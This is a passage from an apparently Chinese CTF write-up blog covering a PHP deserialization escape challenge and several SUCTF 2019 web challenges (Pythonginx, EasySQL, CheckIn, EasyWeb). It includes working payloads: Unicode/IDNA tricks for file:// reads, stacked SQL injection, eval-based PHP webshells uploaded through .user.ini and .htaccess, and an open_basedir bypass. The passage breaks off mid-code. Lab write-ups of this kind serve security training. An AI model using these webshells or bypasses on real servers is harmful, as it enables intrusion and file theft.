href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>题中<code>www.zip</code>中包含源码，下载<del>后进行代码审计（不会）</del>翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件<br>config.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    $config[<span class=\"string\">'hostname'</span>] = <span class=\"string\">'127.0.0.1'</span>;</span><br><span class=\"line\">    $config[<span class=\"string\">'username'</span>] = <span class=\"string\">'root'</span>;</span><br><span class=\"line\">    $config[<span class=\"string\">'password'</span>] = <span class=\"string\">''</span>;</span><br><span class=\"line\">    $config[<span class=\"string\">'database'</span>] = <span class=\"string\">''</span>;</span><br><span class=\"line\">    $flag = <span class=\"string\">''</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>查看index.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($user-&gt;login($username, $password)) &#123;</span><br><span class=\"line\">\t\t\t$_SESSION[<span class=\"string\">'username'</span>] = $username;</span><br><span class=\"line\">\t\t\theader(<span class=\"string\">'Location: profile.php'</span>);<span class=\"comment\">//登入后跳转到profile.php</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">exit</span>;\t</span><br><span class=\"line\">\t\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>查看profile.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>   </span><br><span class=\"line\">    <span class=\"keyword\">require_once</span>(<span class=\"string\">'class.php'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SESSION[<span class=\"string\">'username'</span>] == <span class=\"keyword\">null</span>) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Login First'</span>);</span><br><span class=\"line\">&#125;   </span><br><span class=\"line\">$username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">$profile=$user-&gt;show_profile($username);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($profile  == <span class=\"keyword\">null</span>) &#123; </span><br><span class=\"line\">    header(<span class=\"string\">'Location: update.php'</span>); <span class=\"comment\">//$profile为空，跳转到update.php</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">    $profile = unserialize($profile); <span class=\"comment\">//一般看见unserialize()会考虑反序列化漏洞，</span></span><br><span class=\"line\">    $phone = $profile[<span class=\"string\">'phone'</span>]; </span><br><span class=\"line\">    $email = $profile[<span class=\"string\">'email'</span>]; </span><br><span class=\"line\">    $nickname = $profile[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $photo = base64_encode(file_get_contents($profile[<span class=\"string\">'photo'</span>]));<span class=\"comment\">//file_get_contents()此函数可以获得文件内容</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>update.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_POST[<span class=\"string\">'phone'</span>] &amp;&amp; $_POST[<span class=\"string\">'email'</span>] &amp;&amp; $_POST[<span class=\"string\">'nickname'</span>] &amp;&amp; $_FILES[<span class=\"string\">'photo'</span>]) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^\\d&#123;11&#125;$/'</span>, $_POST[<span class=\"string\">'phone'</span>]))</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid phone'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class=\"string\">'email'</span>]))</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid email'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    $file = $_FILES[<span class=\"string\">'photo'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($file[<span class=\"string\">'size'</span>] &lt; <span class=\"number\">5</span> <span class=\"keyword\">or</span> $file[<span class=\"string\">'size'</span>] &gt; <span class=\"number\">1000000</span>)</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Photo size error'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    move_uploaded_file($file[<span class=\"string\">'tmp_name'</span>], <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]));</span><br><span class=\"line\">    $profile[<span class=\"string\">'phone'</span>] = $_POST[<span class=\"string\">'phone'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'email'</span>] = $_POST[<span class=\"string\">'email'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'nickname'</span>] = $_POST[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'photo'</span>] = <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    $user-&gt;update_profile($username, serialize($profile));<span class=\"comment\">//将$profile序列化，执行过滤函数</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'Update Profile Success!&lt;a href=\"profile.php\"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查看update_profile()函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update_profile</span><span class=\"params\">($username, $new_profile)</span> </span>&#123;</span><br><span class=\"line\">    $username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">    $new_profile = <span class=\"keyword\">parent</span>::filter($new_profile); </span><br><span class=\"line\">    $where = <span class=\"string\">\"username = '$username'\"</span>; </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::update(<span class=\"keyword\">$this</span>-&gt;table, <span class=\"string\">'profile'</span>, $new_profile, $where);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查看filter()函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span><span class=\"params\">($string)</span> </span>&#123;</span><br><span class=\"line\">    $escape = <span class=\"keyword\">array</span>(<span class=\"string\">'\\''</span>, <span class=\"string\">'\\\\\\\\'</span>); </span><br><span class=\"line\">    $escape = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $escape) . <span class=\"string\">'/'</span>; </span><br><span class=\"line\">    $string = preg_replace($escape, <span class=\"string\">'_'</span>, $string); <span class=\"comment\">//将  “ ‘ ”、 “\\\\\\\\” 替换成 “_” </span></span><br><span class=\"line\">    $safe = <span class=\"keyword\">array</span>(<span class=\"string\">'select'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'update'</span>, <span class=\"string\">'delete'</span>, <span class=\"string\">'where'</span>);</span><br><span class=\"line\">    $safe = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $safe) . <span class=\"string\">'/i'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> preg_replace($safe, <span class=\"string\">'hacker'</span>, $string); <span class=\"comment\">//将“ select|insert|update|delete|where” 替换成 \"hacker\"，返回替换后的字符串</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在update_profile()，返回到profile.php.</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$profile = unserialize($profile); <span class=\"comment\">//反序列化$profile</span></span><br><span class=\"line\">    $phone = $profile[<span class=\"string\">'phone'</span>]; </span><br><span class=\"line\">    $email = $profile[<span class=\"string\">'email'</span>]; </span><br><span class=\"line\">    $nickname = $profile[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $photo = base64_encode(file_get_contents($profile[<span class=\"string\">'photo'</span>]));</span><br></pre></td></tr></table></figure>\n\n<p>序列化后</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$profile=a:<span class=\"number\">4</span>:&#123;s:<span class=\"number\">5</span>:<span class=\"string\">\"phone\"</span>;s:<span class=\"number\">11</span>:<span class=\"string\">\"11111111111\"</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"email\"</span>;s:<span class=\"number\">8</span>:<span class=\"string\">\"12@12.12\"</span>;s:<span class=\"number\">8</span>:<span class=\"string\">\"nickname\"</span>;s:<span class=\"number\">4</span>:<span class=\"string\">\"1234\"</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"photo\"</span>;s:<span class=\"number\">39</span>:<span class=\"string\">\"upload/d41d8cd98f00b204e9800998ecf8427e\"</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>要让$photo得到的文件是config.php也就是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;</span><br></pre></td></tr></table></figure>\n<p>变成 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;</span><br></pre></td></tr></table></figure>\n<p>序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。</p>\n<p>因为nickname有长度限制使用数组可以绕过</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure>\n<p>让nickname的值为<code>&quot;};s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>长度为34,传入34个where</p>\n<h3 id=\"0x03-开始操作\"><a href=\"#0x03-开始操作\" class=\"headerlink\" title=\"0x03 开始操作\"></a>0x03 开始操作</h3><p><img src=\"/pic/1.png\" alt=\"1\"> 传入参数</p>\n<p>访问profile.php</p>\n<p><img src=\"/pic/2.png\" alt=\"2\"></p>\n<p>将base64解码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$config[<span class=\"string\">'hostname'</span>] = <span class=\"string\">'127.0.0.1'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'username'</span>] = <span class=\"string\">'root'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'password'</span>] = <span class=\"string\">'qwertyuiop'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'database'</span>] = <span class=\"string\">'challenges'</span>;</span><br><span class=\"line\">$flag = <span class=\"string\">'flag&#123;94b7c4b2-866d-4189-9b0a-abdf22990071&#125;'</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>"},{"title":"buuoj刷题记录11-SUCTF2019web复现","date":"2020-02-04T15:46:53.000Z","_content":"\n## Pythonginx\n\n- 2019 usa black hat一个议题  [会议pdf](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)\n\n  ![](/pic/67)\n\n- 关于[idna编码](https://datatracker.ietf.org/doc/rfc5891/)   在处理℆时，经过idna编码，再经过utf-8解码就会变成c/u\n\n- CVE-2019-9636  : urlsplit不处理NFKC标准化   \n\n<!--more-->\n\n题目给了源码\n\n```python\n@app.route('/getUrl', methods=['GET', 'POST'])\ndef getUrl():\n    url = request.args.get(\"url\")\n    host = parse.urlparse(url).hostname   #返回netloc部分\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 111\"\n    parts = list(urlsplit(url))\n    host = parts[1]\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 222 \" + host\n    newhost = []\n    for h in host.split('.'):\n        newhost.append(h.encode('idna').decode('utf-8'))\n    parts[1] = '.'.join(newhost)\n    #去掉 url 中的空格\n    finalUrl = urlunsplit(parts).split(' ')[0]\n    host = parse.urlparse(finalUrl).hostname\n    if host == 'suctf.cc':\n        return urllib.request.urlopen(finalUrl).read()\n    else:\n        return \"我扌 your problem? 333\"\n```\n\n*parse.urlparse()函数：将URL解析为六个组件，返回一个6个元素的元组，对应URL的一般结构：`scheme://netloc/path;parameters?query#fragment`*\n\n大致意思就是第一二次判断时netloc不是 suctf.cc，第三次要是suctf.cc,就返回url的网页源码\n\n题目标题是pythonginx，提示nginx，nginx文件路径如下\n\n```\n配置文件存放目录：/etc/nginx\n主配置文件：/etc/nginx/nginx.conf\n管理脚本：/usr/lib64/systemd/system/nginx.service\n模块：/usr/lisb64/nginx/modules\n应用程序：/usr/sbin/nginx\n程序默认存放位置：/usr/share/nginx/html\n日志默认存放位置：/var/log/nginx\n网站配置文件：/usr/local/nginx/conf/nginx.conf\n```\n\n\n\n**非预期解**\n\n以下是urlsplit函数源码\n\n```python\ndef urlunsplit(components):\n    scheme, netloc, url, query, fragment, _coerce_result = (\n                                          _coerce_args(*components))\n    if netloc or (scheme and scheme in uses_netloc and url[:2] != '//'):\n        if url and url[:1] != '/': url = '/' + url\n        url = '//' + (netloc or '') + url\n    if scheme:\n        url = scheme + ':' + url\n    if query:\n        url = url + '?' + query\n    if fragment:\n        url = url + '#' + fragment\n    return _coerce_result(url)\n```\n\n这个函数的作用就是如果截取的URL（也就是path的位置）包含//就不再处理path。\n\n也就是`scheme:////netloc/path;parameters?query#fragment`经过urlsplite处理后会变成\n\n```\nscheme='scheme', netloc='', path='//netloc/path;parameters', query='query', fragment='fragment'\n```\n\n再经过urlunsplit处理后会变成\n\n```\nscheme://netloc/path;parameters?query#fragment\n```\n\n如果传入的url是\n\n```\nfile:////suctf.cc/etc/passwd\n```\n\n会返回主机的用户记录\n\n```bash\nroot:*:17647:0:99999:7:::\ndaemon:*:17647:0:99999:7:::\nbin:*:17647:0:99999:7:::\nsys:*:17647:0:99999:7:::\nsync:*:17647:0:99999:7:::\ngames:*:17647:0:99999:7:::\nman:*:17647:0:99999:7:::\nlp:*:17647:0:99999:7:::\nmail:*:17647:0:99999:7:::\nnews:*:17647:0:99999:7:::\nuucp:*:17647:0:99999:7:::\nproxy:*:17647:0:99999:7:::\nwww-data:*:17647:0:99999:7:::\nbackup:*:17647:0:99999:7:::\nlist:*:17647:0:99999:7:::\nirc:*:17647:0:99999:7:::\ngnats:*:17647:0:99999:7:::\nnobody:*:17647:0:99999:7:::\n_apt:*:17647:0:99999:7:::\nnginx:!:17708:0:99999:7:::\n```\n\n查看配置文件\n\n```\ngetUrl?url=file:////suctf.cc/etc/nginx/nginx.conf\n```\n\n![](/pic/66)\n\n查看网站配置文件\n\n```\ngetUrl?url=file:////suctf.cc/usr/local/nginx/conf/nginx.conf\n```\n\n```\nserver {\n    listen 80;\n    location / {\n        try_files $uri @app;\n    }\n    location @app {\n        include uwsgi_params;\n        uwsgi_pass unix:///tmp/uwsgi.sock;\n    }\n    location /static {\n        alias /app/static;\n    }\n    # location /flag {\n    #     alias /usr/fffffflag;\n    # }\n}\n```\n\n提示flag再 /usr/fffffflag 中\n\n```\ngetUrl?url=file:////suctf.cc/usr/fffffflag\n```\n\n```\nflag{b692ca82-8292-4582-846a-286b3743f697}\n```\n\n\n\n**预期解**\nblack hat 上的所展示的部分字符\n![](/pic/69.png)\n\nAltman师傅写的脚本\n\n```\n# coding:utf-8 \nfor i in range(128,65537):    \n    tmp=chr(i)    \n    try:        \n        res = tmp.encode('idna').decode('utf-8')        \n        if(\"-\") in res:            \n            continue        \n        print(\"U:{}    A:{}      ascii:{} \".format(tmp, res, i))    \n    except:        \n        pass\n```\n\n\n可以使用**U+2102，ℂ**代替c，或者**U+2106, ℆**代替c/u\n\n\n读取网站配置文件\n\n```\ngetUrl?url=file:////suctf.ℂℂ/usr/local/nginx/conf/nginx.conf\n或者\ngetUrl?url=file:////suctf.c℆usr/local/nginx/conf/nginx.conf\n```\n\n读取flag\n\n```\n/getUrl?url=file://suctf.cℂ/usr/fffffflag\n或者\ngetUrl?url=file:////suctf.c℆usr/fffffflag\n```\n\n\n\n## EasySQL\n\n拿到题目是一个输入框，post类型提交\n\n先fuzz一遍，以下关键字被过滤\n\n![](/pic/68.png)\n\n**非预期解**\n\n```\n*,1\n```\n\n```\nArray ( [0] => flag{36c7b843-6efb-409d-a1fe-3ef54fce7d6d} [1] => 1 )\n```\n\n\n\n**预期解**\n\n根据测试发现输入长度最大为40个字符\n\n还发现存在堆叠注入\n\n```\n1;show databases;#\n \nArray ( [0] => 1 ) Array ( [0] => ctf ) Array ( [0] => ctftraining ) Array ( [0] => information_schema ) Array ( [0] => mysql ) Array ( [0] => performance_schema ) Array ( [0] => test )\n```\n\n经过测试查询语句应该类似于\n\n```\nselect $_POST['query'] || flag ...\n```\n\n关于[sql_mod](https://mariadb.com/kb/en/sql-mode/)\n\n当设置sql_mode=**PIPES_AS_CONCAT**时，将\"||\"视为字符串的连接操作符而非或运算符，这和 Oracle 数据库是一样的，也和字符串的拼接函数 Concat 相类似\n\n所以payload为：\n\n```\n1;set sql_mode=PIPES_AS_CONCAT;select 1\n```\n\n返结果为：\n\n```\nArray ( [0] => 1 ) Array ( [0] => 1flag{36c7b843-6efb-409d-a1fe-3ef54fce7d6d} )\n```\n\n\n\n## CheckIn\n\n先直接上传图片马，提示文件内容包含`<?`，采用js的写法绕过\n\n```js\n<script language=\"php\"> \neval($_POST[cmd]);\n</script>\n```\n\n改后缀为PHP、PHP2、PHP3、PHP4、PHP5、Phtml，发现都被过滤\n\nphp有一个文件是[.user.ini](https://www.php.net/manual/zh/configuration.file.per-user.php)    [参考连接]([https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html](https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html))\n\n![](/pic/70)\n\n先上传一个图片马\n\n```http\nContent-Disposition: form-data; name=\"fileUpload\"; filename=\"1.gif\"\nContent-Type: image/gif\n\nGIF89a\n<script language=\"php\"> \neval($_POST[cmd]);\n</script>\n```\n\n上传.htaccess发现没有生效，然后上传.user.ini\n\n```\nContent-Disposition: form-data; name=\"fileUpload\"; filename=\"1.gif\"\nContent-Type: image/gif\n\nGIF89a\nauto_prepend_file=1.gif\n```\n\nauto_prepend_file=1.gif  相当于文件夹下所有文件都包含1.gif\n\n返回信息\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Upload Labs</title>\n</head>\n\n<body>\n    <h2>Upload Labs</h2>\n    <form action=\"index.php\" method=\"post\" enctype=\"multipart/form-data\">\n        <label for=\"file\">文件名：</label>\n        <input type=\"file\" name=\"fileUpload\" id=\"file\"><br>\n        <input type=\"submit\" name=\"upload\" value=\"提交\">\n    </form>\n</body>\n\n</html>\n\nYour dir uploads/2c67ca1eaeadbdc1868d67003072b481 <br>Your files : <br>array(5) {\n  [0]=>\n  string(1) \".\"\n  [1]=>\n  string(2) \"..\"\n  [2]=>\n  string(9) \".user.ini\"\n  [3]=>\n  string(5) \"1.gif\"\n  [4]=>\n  string(9) \"index.php\"\n}\n```\n\n使用蚁剑连接`host/uploads/2c67ca1eaeadbdc1868d67003072b481/index.php`即可\n\n![](/pic/71.png)\n\n\n\n## EasyWeb\n\n打开题目就是源码\n\n```php\n<?php\nfunction get_the_flag(){\n    // webadmin will remove your upload file every 20 min!!!! \n    $userdir = \"upload/tmp_\".md5($_SERVER['REMOTE_ADDR']);\n    if(!file_exists($userdir)){\n    mkdir($userdir);\n    }\n    if(!empty($_FILES[\"file\"])){\n        $tmp_name = $_FILES[\"file\"][\"tmp_name\"];\n        $name = $_FILES[\"file\"][\"name\"];\n        $extension = substr($name, strrpos($name,\".\")+1);\n    if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); \n        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die(\"^_^\");\n    if(!exif_imagetype($tmp_name)) die(\"^_^\"); \n        $path= $userdir.\"/\".$name;\n        @move_uploaded_file($tmp_name, $path);\n        print_r($path);\n    }\n}\n\n$hhh = @$_GET['_'];\n\nif (!$hhh){\n    highlight_file(__FILE__);\n}\n\nif(strlen($hhh)>18){\n    die('One inch long, one inch strong!');\n}\n\nif ( preg_match('/[\\x00- 0-9A-Za-z\\'\"\\`~_&.,|=[\\x7F]+/i', $hhh) )\n    die('Try something else!');\n\n$character_type = count_chars($hhh, 3);\nif(strlen($character_type)>12) die(\"Almost there!\");\n\neval($hhh);\n?>\n```\n\n首先要绕过长度，然后是绕过正则。\n\n绕过长度可以新建一个变量，可以使用异或或者非运算绕过。（~操作要比异或简单，但是被禁用，可以使用异或运算模拟非运算）\n\n异或构造$_GET['\\_']\n\n```\necho urlencode(urldecode(\"%ff%ff%ff%ff\")^\"_GET\"); //%A0%B8%BA%AB\n```\n\npayload：\n\n```\n?_=${%FF%FF%FF%FF^%A0%B8%BA%AB}{%ff}();&%ff=phpinfo\n```\n\n查看phpinfo禁用了如下函数\n\n```\npcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail\n```\n\n还设置了`open_basedir`\n\n```\nopen_basedir\t/var/www/html/:/tmp/\n```\n\n\n\n```php\nfunction get_the_flag(){\n    // webadmin will remove your upload file every 20 min!!!! \n    $userdir = \"upload/tmp_\".md5($_SERVER['REMOTE_ADDR']);\n    if(!file_exists($userdir)){\n    mkdir($userdir);\n    }\n    if(!empty($_FILES[\"file\"])){\n        $tmp_name = $_FILES[\"file\"][\"tmp_name\"];\n        $name = $_FILES[\"file\"][\"name\"];\n        $extension = substr($name, strrpos($name,\".\")+1);\n    if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); \n        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die(\"^_^\");\n    if(!exif_imagetype($tmp_name)) die(\"^_^\"); \n        $path= $userdir.\"/\".$name;\n        @move_uploaded_file($tmp_name, $path);\n        print_r($path);\n    }\n}\n```\n\nstrrpos(要被检查的字符串,要搜索的字符串) :返回文件最后出现的位置\n\nmb_strpos(要被检查的字符串,要搜索的字符串)：返回要查找的字符串在别一个字符串中首次出现的位置\n\n此函数大致意思是文件内容不能包含<?，上传的文件要经过exif_imagetype（）检测\n\n\n\n使用payload上传文件\n\n```\n?_=${%FF%FF%FF%FF^%A0%B8%BA%AB}{%ff}();&%ff=get_the_flag\n```\n\n.htaccess\n\n```\n#define height 12\n#define width 12\nAddType application/x-httpd-php .cc\nphp_value auto_append_file \"php://filter/convert.base64-decode/resource=1.cc\"\n```\n\n1.cc\n\n```\nGIF89a00PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==\n```\n\nGIF89a与后面加密过的一句话不能使用空格或者回车隔开,因为base64解密文件时会出错，00可以修改为base64中允许出现的任意两个字符，此服务器版本为7.0+无法使用JS写法绕过<?\n\n\n\n[绕过open_basedir参考文章](https://www.cnblogs.com/cimuhuashuimu/p/11544487.html)\n\n绕过payload\n\n```\nchdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));`\n```\n\n\n\n先扫描目录\n\n```\n/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/1.cc\n```\n\npost内容\n\n```\ncmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));\n```\n\n返回内容\n\n![](/pic/72.png)\n\n找到flag，读取flag\n\n```\ncmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file('/THis_Is_tHe_F14g'));\n```\n\n![](/pic/73.png)\n\n\n\n## Upload Labs 2\n\n给出了源码\n\n```php\n//admin.php\n<?php\ninclude 'config.php';\n\nclass Ad{\n\n    public $cmd;\n\n    public $clazz;\n    public $func1;\n    public $func2;\n    public $func3;\n    public $instance;\n    public $arg1;\n    public $arg2;\n    public $arg3;\n\n    function __construct($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3){  //构造类时调用的方法\n\n        $this->cmd = $cmd;\n\n        $this->clazz = $clazz;\n        $this->func1 = $func1;\n        $this->func2 = $func2;\n        $this->func3 = $func3;\n        $this->arg1 = $arg1;\n        $this->arg2 = $arg2;\n        $this->arg3 = $arg3;\n    }\n\n    function check(){\n\n        $reflect = new ReflectionClass($this->clazz);\n        $this->instance = $reflect->newInstanceArgs();  //实例化clazz类\n\n        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func1);\n        $reflectionMethod->invoke($this->instance, $this->arg1); //执行clazz中的func1方法，参数为arg1\n\n        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func2);\n        $reflectionMethod->invoke($this->instance, $this->arg2);//执行clazz中的func2方法，参数为arg2\n\n        $reflectionMethod = new ReflectionMethod($this->clazz, 